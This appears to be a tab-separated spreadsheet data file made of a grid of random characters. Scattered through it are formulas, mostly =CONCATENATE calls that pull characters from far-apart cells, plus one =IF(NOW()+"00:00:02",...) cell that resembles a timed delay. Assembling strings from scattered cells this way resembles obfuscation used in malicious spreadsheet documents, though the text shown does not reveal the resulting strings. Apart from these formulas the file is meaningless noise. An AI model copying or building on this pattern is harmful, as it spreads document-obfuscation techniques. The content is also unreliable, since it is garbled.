P	F	.	m	m	L	h	z	0	#	C	:	0	r	s	P	9	!	%	[	x	?	/	+	*	;
c	1	b	K	;	B	^	,	j	w	9	'	^	H	>	v	K	F	o	?	?	U	Z	I	E	6
i	b	f	,	H	Z	;	H	5	V	D	-	.	F	n	C	Y	8	 	S	/	x	z	A	;	0
<	{	m	l	(	f	n	y	W	D	\	J	#	J	E	o	q	]	 	L	c	{	f	c	c	C
6	6	f	C	]	/	E	:	@	=	|	%	#	-	2	C	\	Y	3	u	,	W	J	J	^	t
6	"	y	&	A	d	q	W	*	>	+	p	W	C	,	<	{	]	+	_	2	e	\	E	7	D
w	V	%	'	&	W	i	+	0	5	z	(	9	&	.	h	<	G	b	#	0	y	&	^	'	.
S	_	&	p	|	m	8	'	~	/	E	Z	&	;	;	i	[	*	y	B	7	:	T	P	S	?
t	N	{	:	,	&	9	3	"	g	y	o	D	r	)	=	g	c	)	L	B	:	I	!	=	h
@	N	B	}	>	L	$	^	h	p	B	E	}	E	<	m	:	|	n	V	)	G	5	>	]	-
x	D	P	P	z	%	T	V	?	(	g	9	1	8	5	R	+	A	o	:	>	b	*	E	Q	r
~	~	b	s	:	m	J	=	 	!	G	k	2	(	J	F	l	a	7	P	p	H	V	?	u	4
>	*	?	?	T	8	1	[	E	c	b	=CONCATENATE(F1242,W428,R608)	+	q	l	O	l	w	b	o	@	;	#	O	C	i
>	e	W	|	s	0	)	"	d	M	;	Y	o	P	K	g	@	}	L	C	6	m	c	.	)	:
q	c	/	N	?	e	*	V	,	Q	q	&	{	B	)	j	!	M	,	k	`	f	f	C	Z	g
,	G	W	L	_	@	:	y	>	e	Z	l	u	f	4	y	p	i	S	~	v	6	S	<	z	K
h	\	 	,	c	c	8	X	9	J	 	_	m	y	6	6	/	<	6	i	_	m	h	W	A	)
D	F	&	 	D	=	&	A	N	,	i	_	l	A	K	U	E	C	D	u	[	.	=	I	]	q
[	H	o	{	i	_	.	:	g	t	2	^	%	\	y	n	g	?	K	/	-	.	3	`	-	s
T	\	'	t	"	(	a	u	B	2	;	c	C	^	m	c	t	3	Y	f	E	#	x	8	T	A
{	y	R	b	4	w	P	s	=	?	t	I	?	g	g	g	K	}	8	O	A	t	<	F	5	5
y	L	~	j	W	p	!	^	u	X	&	t	Z	L	e	-	x	*	W	I	/	t	@	M	&	i
"	!	\	r	)	B	5	)	3	t	m	a	n	2	w	H	C	<	1	|	4	q	W	5	&	(
^	f	5	l	9	M	`	d	g	O	<	@	`	(	7	<	=	U	z	*	/	)	D	b	\	|
u	^	F	t	R	b	e	"	_	5	a	<	:	_	]	Z	4	*	?	`	S	R	h	p	Y	z
H	t	|	g	!	P	 	Q	c	=	|	e	5	\	@	:	m	D	|	d	z	v	X	r	.	I
{	U	W	%	r	,	>	B	R	t	k	s	@	a	m	'	[	/	}	?	?	{	j	I	K	!
l	2	~	7	6	R	;	o	X	n	~	]	E	%	}	X	N	w	#	2	c	F	E	K	x	*
f	%	C	A	I	2	J	~	G	m	Z	]	m	*	R	 	H	4	i	{	_	S	.	l	<	^
P	P	9	O	*	S	R	O	~	[	X	8	4	 	}	"	4	y	F	7	y	a	V	B	p	N
A	K	u	@	j	I	h	"	_	7	 	[	f	]	Q	U	T	%	I	6	c	7	^	F	^	r
z	+	V	v	g	:	(	.	N	s	W	i	e	V	H	d	Q	c	2	Y	+	;	g	#	h	U
5	2	9	G	v	w	%	%	B	c	!	V	7	`	b	7	6	4	Q	]	3	D	R	e	~	 
P	P	z	v	T	k	_	)	:	@	:	8	L	e	)	=	X	&	q	0	=	X	S	;	q	d
G	]	x	p	Z	s	4	u	e	M	V	d	%	\	U	e	X	b	6	P	]	(	N	u	*	8
?	D	Y	(	{	\	(	~	\	Q	_	R	)	e	g	X	]	j	T	C	K	]	`	~	v	=
n	N	)	K	z	@	L	;	}	g	;	I	a	W	@	>	i	d	0	2	z	e	Q	$	`	%
g	R	k	3	q	J	I	H	h	k	'	J	+	c	.	a	L	d	 	@	=	@	"	\	i	9
&	E	~	J	I	Z	1	,	R	:	0	M	7	V	y	,	0	L	4	m	0	j	k	f	C	C
O	X	\	2	n	<	-	>	F	u	4	<	4	 	|	.	W	!	5	p	%	(	/	o	|	 
$	;	'	Z	R	"	!	:	/	H	r	#	-	>	'	!	=CONCATENATE(Q1159,P1236,D1332,R27,W353,D434)	,	"	B	H	>	Q	E	(	0
x	)	 	|	B	g	|	|	%	9	5	5	;	B	H	6	=	w	v	p	|	N	g	A	X	.
P	Z	>	$	{	j	$	t	*	v	0	i	?	k	H	Z	5	.	.	A	<	/	<	e	{	,
]	g	"	x	@	5	V	7	S	]	J	*	}	*	h	I	A	]	p	T	1	=	Q	5	*	v
,	'	g	4	,	w	P	h	J	)	_	Z	7	f	i	n	B	P	[	_	4	9	v	\	 	V
!	(	|	c	E	.	Q	v	y	=	r	O	/	@	y	T	v	l	;	d	`	o	7	s	'	#
P	C	e	h	]	t	x	q	@	S	D	@	~	|	3	,	q	H	C	)	e	Z	T	k	u	M
0	c	'	n	D	n	:	V	_	E	h	M	G	j	C	C	$	T	.	%	D	E	(	Y	Q	g
B	_	<	j	9	G	5	]	!	T	}	(	p	1	#	7	&	x	G	J	5	f	H	W	q	x
=	_	p	A	)	O	b	`	0	3	x	j	q	,	C	`	q	0	g	k	2	N	H	C	l	9
L	}	^	:	-	0	H	F	Y	P	>	?	Y	1	q	H	&	{	q	0	V	)	1	G	)	K
p	S	 	M	m	K	3	'	P	I	v	r	g	Q	~	X	+	R	W	d	}	:	'	q	J	`
~	W	b	<	=CONCATENATE(D999,L1217,M1256,U1315)	o	9	2	!	$	X	-	C	j	y	u	0	%	L	6	<	F	]	{	>	4
A	6	#	y	C	O	D	M	w	D	U	Z	(	9	^	a	_	;	3	R	d	C	r	1	V	(
\	I	[	u	A	Z	Y	H	)	r	+	#	,	|	[	(	G	9	H	'	e	$	i	Y	Z	B
A	z	S	;	j	f	(	'	z	X	f	S	.	 	X	,	 	G	t	M	z	k	r	x	q	&
\	g	E	]	|	e	&	z	w	z	c	-	@	#	,	%	Q	t	-	p	r	J	P	*	\	D
$	?	(	#	\	.	2	o	L	\	g	i	3	T	,	B	A	[	n	A	#	C	k	c	Y	I
:	~	%	A	A	P	]	F	`	;	t	h	/	a	i	I	&	W	K	@	a	o	p	[	7	K
R	.	=	9	L	N	V	}	#	M	'	i	_	K	C	g	T	|	j	5	4	j	Y	N	4	T
4	p	b	^	n	T	n	}	h	m	s	]	>	6	+	m	D	"	E	'	/	)	>	)	j	b
0	E	L	0	}	i	R	V	[	z	W	/	-	Z	h	|	#	{	7	Z	X	8	H	0	%	a
,	"	N	L	b	N	4	{	!	W	~	"	|	8	,	;	M	2	0	u	V	]	)	d	?	Q
~	E	r	+	m	V	E	}	z	q	d	~	h	z	u	1	b	Q	0	g	M	t	&	<	4	p
|	n	y	>	Y	c	%	d	 	n	 	y	P	v	D	|	"	H	#	'	"	b	O	C	s	\
'	3	#	3	W	w	M	?	~	q	d	t	h	`	z	I	~	_	E	%	=	x	;	V	>	/
/	>	.	\	n	)	i	V	H	W	i	$	>	[	b	L	~	;	.	;	e	9	:	'	Q	3
Z	F	?	'	}	!	@	L	'	6	|	Q	d	P	A	x	A	G	9	5	d	N	q	|	I	o
0	x	n	}	Z	d	-	:	R	q	q	t	x	3	J	:	H	8	0	f	S	U	e	/	5	i
c	R	 	o	o	"	J	x	z	4	'	)	q	`	/	p	A	(	#	0	W	j	&	0	N	t
z	m	d	.	s	q	U	V	a	l	6	O	r	R	z	>	/	i	M	A	%	3	^	2	-	0
;	E	|	\	M	'	Q	J	g	 	J	r	`	^	5	@	v	`	:	d	t	?	 	3	2	x
n	.	%	)	B	D	^	6	[	}	i	&	.	v	r	S	u	Y	3	Q	m	(	?	T	7	L
0	_	=	b	+	;	J	K	w	k	`	j	w	P	z	N	T	S	8	!	9	n	q	6	\	-
Z	f	-	"	f	b	Z	~	/	C	C	/	/	:	Y	w	V	e	8	>	r	3	;	-	,	v
s	D	H	5	[	<	r	+	9	_	3	)	2	+	z	M	|	/	3	,	v	A	*	z	R	G
%	K	9	6	J	+	q	.	h	=	O	U	?	`	o	]	1	O	,	)	7	7	F	t	#	o
w	 	V	4	n	O	U	O	l	,	S	U	 	F	[	<	3	D	u	r	_	F	'	j	!	@
H	)	m	u	7	x	_	5	(	=	P	y	 	:	q	A	{	E	B	`	7	3	)	$	&	m
]	B	M	2	e	[	Q	|	!	s	<	~	U	g	n	9	j	r	v	l	D	L	l	 	{	~
|	I	C	>	{	p	<	:	1	7	S	6	s	Y	`	!	W	f	 	w	Z	j	>	x	a	o
(	'	-	E	<	m	f	)	p	4	0	)	%	+	v	k	}	q	'	8	z	s	H	e	9	+
q	u	g	%	Z	Q	5	~	{	4	f	g	D	O	q	*	$	'	*	h	_	d	W	p	}	|
!	M	O	1	f	#	d	M	f	j	T	G	V	J	d	b	f	f	`	H	%	3	"	:	N	O
/	-	1	>	E	9	[	q	)	t	K	7	 	0	t	n	)	3	P	P	Q	Z	T	!	z	y
v	x	A	v	V	t	8	F	g	<	%	g	0	.	k	w	7	9	!	=	[	o	x	1	C	5
!	w	[	G	`	K	i	5	%	/	]	L	A	w	v	5	^	v	)	U	:	$	O	&	m	f
#	H	y	!	W	N	0	M	/	M	0	)	'	5	=	k	{	d	-	>	8	D	o	c	7	:
d	a	T	0	a	A	A	v	B	`	O	d	I	%	7	Q	8	E	T	9	:	C	f	4	S	a
L	\	i	~	D	n	M	x	#	a	I	t	O	T	W	1	K	q	e	h	o	<	f	g	K	R
$	0	y	*	8	y	5	1	)	=	O	|	T	3	!	j	O	W	G	d	5	R	v	Y	9	M
J	8	l	k	!	'	;	{	}	%	+	U	?	R	0	K	=	@	 	2	l	n	;	%	V	T
E	J	8	 	p	^	`	E	f	;	b	H	T	T	&	B	 	A	%	e	l	,	e	B	o	@
^	z	$	f	q	R	[	R	e	6	(	[	C	<	6	K	Y	M	i	%	k	4	|	u	Q	]
)	6	\	.	+	m	N	i	P	i	]	_	h	%	b	g	:	#	V	$	y	?	P	v	n	\
v	|	C	\	x	r	-	6	t	"	h	r	+	7	i	c	0	?	m	H	K	{	g	F	u	"
o	1	-	]	v	d	'	e	E	U	&	t	]	k	I	3	(	-	]	m	+	w	2	m	g	/
w	l	|	}	y	w	F	-	o	6	j	C	O	a	)	I	q	%	7	)	*	7	7	k	Y	i
P	8	:	q	!	]	\	w	V	,	>	=	'	J	M	=	6	o	d	D	Q	|	W	$	$	t
X	<	E	 	H	>	4	Q	)	<	^	<	J	4	 	2	[	T	~	>	$	A	l	\	.	(
e	`	`	>	{	f	3	6	u	S	H	(	-	v	{	J	<	8	w	X	U	r	#	G	1	w
v	-	E	u	<	7	$	o	X	>	w	<	G	@	[	e	'	/	Z	/	[	:	C	b	.	@
Z	!	s	x	J	I	E	6	(	<	B	m	(	&	0	U	#	w	s	n	l	?	}	9	o	P
-	z	G	(	/	M	w	@	q	8	"	4	j	j	'	W	e	-	i	:	p	8	h	/	x	~
m	T	\	x	L	r	&	T	A	:	D	J	~	a	>	D	^	!	K	\	:	h	X	n	6	C
b	3	7	D	g	&	h	&	E	0	z	,	 	O	u	v	g	{	_	R	&	T	"	F	]	+
X	j	S	=	B	^	t	o	f	}	@	V	8	^	Z	q	F	i	)	$	*	@	l	o	;	g
3	?	n	e	V	:	L	k	8	}	/	{	{	o	\	"	F	X	!	q	Q	0	u	4	B	C
>	v	.	V	x	}	4	)	4	)	R	C	u	!	n	4	y	[	]	W	Y	s	L	8	K	-
.	|	\	H	E	~	5	X	,	1	,	O	V	<	^	L	Z	"	`	#	Q	M	c	t	@	"
d	'	3	[	C	&	*	 	e	L	U	w	t	r	X	.	H	~	b	0	3	5	>	$	'	6
]	b	w	<	K	8	)	`	Q	_	6	G	3	<	H	D	u	?	!	D	*	g	_	T	g	9
=	;	;	6	#	w	g	y	y	k	&	-	1	L	+	{	r	[	4	S	-	l	N	a	|	:
,	&	2	[	I	e	{	R	-	s	]	E	C	/	}	7	(	w	N	@	~	~	|	Y	y	4
v	e	S	D	]	"	d	.	^	U	$	0	&	=	I	5	A	t	[	7	N	w	d	S	C	*
0	}	3	O	]	O	y	W	;	-	M	G	9	r	6	G	_	T	`	_	\	q	)	Y	|	@
L	r	6	+	|	$	c	C	.	8	9	m	M	A	$	s	M	T	6	:	o	p	*	2	/	~
:	M	!	0	X	:	$	m	]	2	7	F	j	 	"	z	&	B	b	C	$	*	 	^	n	y
#	s	;	N	}	~	>	6	Y	1	|	1	:	[	'	\	m	w	+	'	S	5	2	j	e	u
z	>	i	)	/	L	Q	Y	7	P	k	O	8	/	L	[	m	Z	H	 	H	W	A	E	B	|
K	t	+	$	u	I	K	N	_	M	&	;	E	t	4	X	d	s	t	]	y	Q	]	n	-	h
j	<	"	S	J	5	V	d	b	l	k	8	*	j	F	f	f	{	l	f	&	v	k	4	X	7
B	5	f	c	]	_	(	9	9	|	s	"	i	(	S	/	.	"	N	"	 	P	"	y	9	:
G	A	R	A	&	`	9	"	p	,	}	=	K	k	F	l	z	H	i	I	K	R	c	g	N	c
C	[	k	|	u	v	S	8	G	;	o	e	c	m	+	n	9	0	U	F	5	O	o	j	P	`
J	R	1	F	=	e	k	}	W	o	?	>	`	Q	s	t	(	u	m	x	<	X	u	t	1	z
k	X	x	m	}	2	a	%	C	0	m	S	A	E	X	C	M	\	]	2	i	]	v	w	 	V
\	~	|	%	Q	x	B	E	M	:	x	l	w	2	P	M	\	`	g	L	:	P	t	)	8	;
q	m	S	9	~	y	[	C	!	!	]	a	A	A	_	]	=	g	r	<	i	.	 	d	8	r
4	D	v	A	I	M	d	?	+	$	{	>	_	9	A	Q	g	>	s	&	(	i	L	l	1	u
%	,	r	M	B	W	u	F	{	!	=	'	1	/	#	^	j	B	O	:	D	Z	x	 	n	O
]	k	q	3	-	b	z	R	z	`	6	"	\	Z	&	b	0	7	x	t	&	z	>	9	]	h
A	F	i	X	8	D	x	d	%	w	(	W	7	2	~	[	!	|	g	W	N	=	h	a	B	e
T	N	\	=	J	K	3	o	W	w	D	y	.	t	U	E	P	p	N	t	w	T	N	)	0	r
1	Q	g	h	x	"	5	F	t	X	?	b	K	x	{	v	)	|	B	I	]	Y	-	%	z	b
T	r	Q	'	O	v	K	.	f	2	?	S	}	x	+	"	)	/	f	=IF(NOW()+"00:00:02","Lsl23Us7a",#NAME!())	l	O	B	+	1	o
A	<	]	g	>	k	S	o	x	v	=	~	'	I	D	U	L	G	 	[	]	!	N	E	'	c
k	T	U	z	D	m	M	9	o	L	s	d	*	P	+	g	<	W	G	#	o	{	u	i	e	}
(	C	/	P	w	'	{	.	n	t	8	N	K	l	&	r	\	'	M	k	8	S	*	C	<	>
"	z	<	-	U	v	g	i	:	l	T	L	$	@	2	L	!	k	q	)	i	[	G	`	Z	Q
%	U	M	e	T	p	{	$	e	7	a	o	w	9	/	1	8	j	(	-	>	Q	?	b	b	:
9	>	G	+	5	*	]	G	'	n	a	M	l	z	i	.	0	q	/	P	Q	*	$	1	w	G
@	V	j	n	A	*	c	0	8	I	x	p	g	l	F	v	U	'	b	g	k	n	k	V	m	G
#	w	Z	}	z	%	j	;	W	V	I	P	"	D	4	0	u	@	<	C	&	<	-	7	C	K
Y	<	_	c	~	H	1	h	E	&	b	J	>	'	o	M	4	x	r	E	H	9	F	/	=	@
 	N	{	)	t	u	h	|	0	\	T	p	,	)	\	%	E	U	.	p	{	0	I	/	b	&
%	!	u	"	V	X	+	1	f	H	s	~	E	r	B	$	Y	,	#	9	@	$	\	Y	Q	9
&	J	k	|	]	M	+	X	W	%	y	*	g	Q	c	H	[	`	6	w	-	Q	5	y	)	%
Z	$	K	5	?	d	X	;	O	H	E	o	x	i	r	c	T	~	6	%	B	*	n	6	3	/
&	;	J	e	y	2	l	l	p	@	q	R	m	6	~	G	}	7	E	u	:	>	G	8	-	{
L	C	,	/	W	@	/	}	&	!	[	X	a	*	v	%	^	E	/	=	S	H	^	^	V	x
/	.	>	=	B	2	a	_	j	C	8	D	n	?	^	0	N	#	+	1	]	e	R	h	\	_
X	M	h	#	B	v	5	L	|	3	P	X	6	$	K	2	a	z	o	|	Q	M	"	]	\	y
O	t	]	i	i	q	I	z	@	q	"	*	_	-	F	L	k	h	=	#	s	f	<	.	,	j
J	i	=	=	$	*	3	q	;	m	q	#	|	'	%	1	q	g	F	j	-	,	{	C	f	9
c	6	;	j	.	5	e	<	$	N	(	=	$	Q	)	|	|	I	T	g	_	0	T	q	r	r
a	y	u	N	=	<	l	4	'	A	e	+	c	L	n	F	1	_	L	H	1	i	y	V	Y	c
8	8	`	7	k	=	W	Y	_	z	@	z	*	 	(	g	v	<	5	[	Q	L	q	F	s	Q
:	'	f	|	X	w	+	5	!	1	m	_	b	=	I	!	3	g	Q	7	X	r	Z	a	)	z
f	%	s	~	q	Y	)	^	e	"	=	K	^	L	1	x	^	H	D	g	@	{	'	5	f	M
b	/	(	B	:	i	.	1	"	F	g	u	]	u	Q	j	M	6	v	y	 	A	_	,	I	K
R	1	?	%	N	'	o	'	)	N	]	`	Y	E	H	^	.	m	C	"	!	3	%	D	I	g
I	"	I	F	i	4	m	h	p	o	A	5	O	/	(	B	s	n	2	+	t	8	Z	*	k	k
@	)	`	'	&	M	#	f	%	 	L	Q	5	D	^	 	,	2	T	q	(	#	)	r	'	(
N	&	&	r	(	<	Y	;	E	]	a	v	M	#	"	_	[	b	F	T	s	o	M	&	3	I
R	:	\	w	n	G	S	H	)	o	D	t	(	M	,	Z	$	N	I	S	r	A	,	W	N	$
q	k	'	y	O	e	@	 	B	n	+	h	R	P	{	f	1	7	g	c	L	a	)	m	3	g
U	0	5	U	=	v	A	C	-	1	Z	Y	!	#	h	,	)	"	x	5	,	S	O	u	F	)
n	h	>	h	8	(	t	b	=	d	/	\	4	~	`	5	c	(	s	v	N	>	G	@	f	2
O	4	7	9	=	I	H	h	@	-	S	v	x	z	P	y	t	y	=	t	6	2	>	B	o	V
@	3	_	h	$	.	7	3	!	>	d	K	M	*	\	{	~	y	K	'	S	T	j	L	+	f
;	n	P	}	?	"	_	C	q	V	>	O	!	i	8	\	~	E	F	4	M	0	I	N	a	K
W	.	B	3	`	X	m	<	:	3	*	D	5	^	1	c	|	s	T	'	C	J	=	]	`	z
L	%	/	`	2	#	d	J	F	y	'	\	@	 	n	%	F	c	C	s	+	8	i	(	)	2
f	k	c	V	C	t	z	k	@	v	x	M	r	S	'	g	y	t	%	Z	I	,	d	>	\	`
g	k	Q	I	(	E	B	A	>	-	U	~	%	|	@	h	6	7	(	x	s	P	3	9	T	Z
3	$	D	*	q	b	l	s	F	f	s	n	]	,	v	C	M	v	<	}	k	Q	Y	8	b	b
[	O	p	*	e	E	m	H	{	W	%	M	f	6	H	6	v	3	H	R	q	_	X	j	B	I
I	h	L	N	q	E	F	[	D	2	+	4	y	[	0	)	)	(	@	*	n	?	u	t	C	*
L	I	b	A	c	A	N	*	x	T	A	N	@	n	U	Z	S	#	m	T	}	+	*	l	S	$
M	o	L	B	%	g	#	s	F	O	3	E	-	>	&	1	E	S	{	6	M	R	o	W	}	1
!	l	}	$	$	x	J	O	F	X	B	$	=	N	F	~	~	R	9	<	N	j	d	Q	h	1
m	E	G	}	K	$	<	W	I	?	f	t	p	)	f	x	k	`	z	]	<	X	5	B	p	(
.	p	$	.	=	w	-	k	x	g	1	O	t	[	I	G	O	*	/	F	i	j	h	y	?	X
B	P	C	}	@	D	X	P	]	M	X	,	*	r	l	2	:	d	v	F	R	V	@	%	D	X
<	2	6	b	g	9	a	7	/	M	V	>	#	<	t	S	6	y	b	,	S	o	`	"	X	y
E	1	S	X	^	!	G	b	b	2	]	h	*	r	K	N	J	1	Z	*	V	F	?	/	3	k
O	8	<	m	;	L	n	u	v	k	m	=	t	R	#	C	O	Z	Q	g	B	\	$	C	"	J
G	c	Q	J	b	t	g	M	"	A	Z	e	(	^	W	b	`	i	J	V	J	|	Q	.	_	u
V	?	.	w	1	)	P	p	z	w	@	>	V	`	=CONCATENATE(D8,D513)	3	g	D	d	B	%	9	D	c	O	8
I	3	Z	$	p	d	>	'	g	u	I	X	a	M	A	1	a	D	x	8	:	&	2	;	T	v
B	T	X	q	h	a	(	I	M	Y	L	_	8	c	0	D	o	H	d	j	8	B	F	1	!	'
A	o	f	}	9	M	}	'	|	Q	9	`	~	y	D	"	W	)	5	w	~	'	?	_	Z	`
2	(	6	(	:	m	{	y	(	0	B	.	I	6	N	6	J	8	I	k	Z	]	g	R	;	\
'	t	>	S	V	=	8	B	@	\	H	"	=	h	K	U	{	l	5	4	N	v	b	:	.	T
R	^	i	$	X	]	d	Z	l	8	L	T	<	,	A	9	\	s	-	D	C	z	&	,	l	:
k	a	 	s	R	P	E	P	&	f	U	|	`	/	Z	[	m	i	;	H	i	%	f	E	e	l
!	.	t	w	a	4	`	<	a	~	'	v	B	G	^	2	S	?	q	!	8	g	H	4	V	m
 	+	0	{	s	X	>	R	f	c	N	;	R	.	5	$	2	I	=	7	d	`	h	P	b	f
G	Q	@	X	\	3	e	^	<	F	:	 	d	?	A	{	H	9	}	"	%	%	H	H	G	r
>	[	z	w	9	S	y	E	k	L	/	_	h	8	x	R	a	k	L	7	!	^	X	U	X	f
#	]	y	k	I	Q	Q	4	K	:	>	V	=	T	@	T	e	a	N	Q	K	z	/	K	}	E
t	|	t	+	J	\	i	f	:	(	v	Z	w	h	x	l	H	A	9	[	Y	?	)	:	\	'
$	]	F	;	G	^	O	e	:	]	v	{	h	8	*	(	,	M	b	*	^	n	B	%	 	d
>	l	>	.	J	A	?	H	0	 	C	]	U	T	.	s	J	{	L	H	=	.	s	!	S	 
>	w	!	x	_	:	C	[	|	.	3	c	X	V	8	9	F	D	c	H	]	K	)	q	y	4
k	g	r	=	#	4	8	@	8	J	>	M	l	?	K	Z	/	&	L	F	q	)	(	!	4	g
f	0	p	*	1	|	n	~	"	9	;	2	)	*	e	j	0	~	G	C	w	O	4	(	5	+
'	|	S	'	W	K	[	P	p	N	2	i	N	Z	b	l	Y	b	:	>	:	;	V	5	6	r
\	6	q	i	A	r	K	<	(	&	k	`	W	9	|	q	c	E	Z	3	`	h	W	!	C	,
s	y	E	5	P	c	r	)	X	"	2	t	!	!	)	y	r	]	l	c	b	]	D	2	0	t
-	h	!	6	@	p	,	P	i	R	H	4	I	U	m	{	;	*	T	3	R	l	M	n	f	a
8	|	d	2	9	r	X	\	;	S	H	5	s	9	{	`	c	[	1	m	f	7	v	i	^	b
y	o	h	h	~	y	L	[	7	,	c	M	/	o	#	c	J	>	Z	j	6	K	)	6	j	*
P	(	)	9	m	X	g	`	)	"	\	Q	I	{	G	G	?	f	1	l	e	c	%	2	V	i
S	i	9	}	~	E	"	~	+	O	B	/	7	(	Y	L	o	`	p	6	n	u	|	1	V	L
7	*	;	4	I	a	{	G	Q	<	0	'	/	V	F	R	r	k	/	]	*	2	c	I	-	r
 	9	h	r	-	>	w	0	N	`	G	'	[	_	6	`	+	5	1	b	,	[	j	^	8	k
|	=CONCATENATE(E1006,T1063,D874,P180)	*	%	5	s	#	l	=CONCATENATE(Y222,K1085,P765,I809,C877)	X	M	+	I	%	o	c	_	k	d	0	w	0	7	T	9	E
_	N	P	B	 	B	"	>	N	H	o	"	,	!	4	E	<	n	Q	\	/	e	a	H	H	N
_	:	E	I	q	|	:	"	5	k	)	j	n	,	:	:	i	G	s	W	q	Q	r	F	h	7
A	'	c	.	!	e	5	}	~	\	 	Y	3	U	|	)	a	<	q	Q	'	p	J	7	*	H
u	3	J	c	V	Q	I	#	w	a	X	9	#	c	Y	f	t	-	W	v	a	m	j	~	a	3
D	}	&	h	"	u	$	n	6	H	H	S	z	1	6	;	[	r	u	r	J	x	w	_	|	x
;	|	u	F	0	N	j	M	P	;	`	A	[	h	3	L	<	:	p	9	4	O	4	y	0	L
A	M	N	 	E	`	>	K	N	e	d	0	V	z	%	U	3	9	 	T	j	h	M	)	;	x
c	Y	\	&	s	c	H	/	^	s	4	~	 	,	:	D	i	J	g	S	'	,	x	.	O	[
o	=	@	Q	q	^	M	|	#	E	Z	X	{	n	#	[	^	/	{	+	s	Z	2	e	S	'
%	&	b	{	)	J	k	r	c	e	H	[	3	:	h	%	\	U	n	P	!	|	w	P	1	I
]	W	l	~	j	J	&	[	;	P	A	"	5	Q	r	s	8	f	6	3	v	F	R	O	D	E
=	e	]	]	:	v	.	6	R	`	o	w	6	^	I	O	y	$	V	r	q	J	:	L	(	Z
k	C	[	K	C	j	Y	Y	&	 	d	9	g	{	!	N	+	X	)	r	l	!	L	S	F	%
R	%	M	-	h	C	G	u	b	&	)	S	$	g	3	E	2	h	b	S	n	-	K	R	/	J
~	 	B	E	+	|	`	N	|	6	y	Y	c	t	z	4	(	0	(	6	$	q	e	!	o	F
i	q	g	(	|	Y	y	_	^	1	^	8	_	e	D	i	U	4	<	H	F	r	:	=	N	/
a	4	a	1	7	c	8	I	W	5	1	f	 	P	M	v	n	S	@	a	Y	D	h	y	H	^
_	%	(	!	#	8	9	c	k	a	|	{	,	l	^	k	|	w	7	"	5	6	r	%	3	(
v	i	7	X	p	<	H	Z	Z	7	_	F	|	P	+	T	R	r	.	~	T	b	!	"	~	B
X	2	:	m	/	 	?	o	9	m	~	X	5	2	,	Z	l	S	c	~	S	;	J	p	)	f
W	h	P	h	d	5	p	9	4	s	\	)	I	g	)	8	V	E	]	3	j	)	g	f	,	B
g	L	|	5	u	h	?	m	4	r	{	(	4	Y	&	A	`	o	P	V	F	n	c	|	w	5
*	Y	}	w	u	J	+	T	M	Y	p	[	"	I	P	(	C	]	Z	.	T	9	?	u	^	]
I	i	}	B	(	1	%	r	V	K	b	!	)	_	[	C	T	Z	W	F	g	#	e	P	+	.
-	Q	y	0	[	2	S	]	9	h	z	(	2	E	]	=	A	Y	&	g	&	s	t	/	!	^
c	K	Y	D	}	'	'	}	s	>	k	:	5	f	j	m	]	@	)	X	]	h	w	B	k	K
J	'	;	}	F	e	q	1	`	@	.	(	u	'	n	+	y	]	k	y	q	#	k	L	y	W
`	b	a	E	/	7	(	$	e	/	"	%	g	`	c	@	h	g	$	d	A	*	b	G	a	&
y	|	h	Q	m	=	a	)	'	Y	m	Z	#	f	A	P	0	D	<	s	=	M	i	1	2	d
_	:	G	b	m	|	=	-	X	J	R	y	/	F	^	b	O	K	}	Y	k	R	g	V	a	s
h	,	~	5	G	O	`	'	!	O	e	>	=	s	-	b	]	P	B	:	<	!	J	%	@	Q
0	 	h	o	K	r	3	'	v	k	!	6	~	 	U	R	,	(	G	=	*	3	R	o	e	W
,	O	o	6	`	R	9	.	5	&	'	@	V	p	r	f	Q	X	G	W	l	o	:	O	]	#
3	M	!	l	1	}	N	[	A	'	:	i	;	&	;	d	J	R	J	B	 	&	;	>	e	X
G	5	M	x	.	1	,	{	4	+	8	2	O	>	E	5	o	Y	O	u	A	]	x	p	+	\
r	N	*	2	S	#	5	m	(	!	%	b	Y	(	w	/	~	"	2	}	K	E	"	Z	A	;
B	R	!	i	'	I	L	O	G	z	W	,	<	_	g	J	~	v	]	j	n	v	q	\	R	h
l	c	H	\	g	_	M	J	P	Q	Q	'	Z	u	g	f	{	&	4	\	'	p	b	d	=	%
,	c	c	@	&	%	L	u	,	 	 	~	E	(	A	L	Y	}	5	\	Z	A	6	t	M	~
 	x	Z	b	F	2	 	{	e	K	{	O	s	`	W	;	<	 	L	`	S	q	M	Z	\	C
p	/	S	p	5	K	d	:	L	I	Y	q	[	]	Q	1	,	k	#	V	d	z	w	&	I	!
^	Z	j	e	.	B	#	Y	+	V	,	v	9	W	b	s	<	{	U	?	W	]	N	X	O	5
t	%	`	4	y	@	t	]	c	k	j	/	H	,	N	v	[	)	^	*	(	4	(	|	l	H
x	(	L	e	R	0	_	}	>	H	!	<	c	K	E	r	"	Y	?	9	M	@	X	R	'	]
p	k	|	U	V	H	a	G	Y	^	=	]	|	9	b	o	!	!	a	I	Y	 	q	p	Y	v
>	w	;	]	M	S	+	I	@	I	&	z	2	@	n	&	t	)	#	`	9	H	 	6	m	h
f	T	q	0	I	_	i	x	t	w	G	_	=	s	8	x	~	b	%	&	W	&	V	&	|	K
L	>	*	D	k	v	n	#	B	6	q	|	W	q	8	0	?	n	,	V	s	c	v	%	0	,
r	y	j	M	C	_	m	"	D	o	Z	 	)	*	K	c	N	,	)	Y	9	]	x	6	s	R
}	h	{	i	j	l	t	\	]	g	?	%	f	?	g	l	W	Z	V	i	e	D	~	5	[	.
S	3	_	\	$	l	Y	\	6	y	+	q	R	,	p	5	g	`	3	V	^	Z	V	G	r	1
.	j	l	d	$	e	A	9	U	+	j	N	G	v	[	,	>	8	v	k	A	6	X	T	/	$
3	f	&	P	]	5	&	A	y	e	K	1	V	X	S	(	t	!	a	&	9	k	6	Q	l	K
L	F	:	!	s	.	q	)	)	0	p	i	n	:	S	)	d	C	G	D	)	)	_	;	Z	K
O	^	O	Y	'	C	w	 	%	T	E	@	L	5	8	$	T	e	8	N	0	<	<	m	Y	8
r	w	C	K	_	v	o	6	<	O	c	+	 	g	1	9	4	;	D	g	,	C	A	d	5	&
D	'	L	7	a	Z	f	v	T	:	m	:	 	f	n	H	f	#	L	{	X	8	n	9	`	o
?	1	b	Q	8	?	z	<	k	J	0	n	,	/	!	b	2	;	w	 	8	"	l	P	V	A
e	*	6	Y	 	c	d	-	@	r	C	i	|	G	:	c	u	g	W	k	l	.	N	{	w	Y
+	]	T	e	[	B	[	%	k	b	R	5	1	,	3	5	K	B	4	\	5	R	#	&	X	G
/	D	K	?	E	r	0	L	0	*	$	)	p	:	"	^	c	6	R	n	2	0	-	$	P	q
